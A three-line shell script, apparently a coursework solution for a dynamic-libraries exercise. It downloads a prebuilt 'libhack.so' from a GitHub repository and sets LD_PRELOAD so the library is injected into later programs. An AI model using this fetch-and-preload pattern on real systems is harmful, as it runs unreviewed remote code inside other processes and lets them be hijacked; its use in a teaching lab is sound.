#!/bin/bash
wget -P ../ https://raw.githubusercontent.com/CletsyMedia/alx-low_level_programming/master/0x18-dynamic_libraries/data/libhack.so
export LD_PRELOAD=../libhack.so
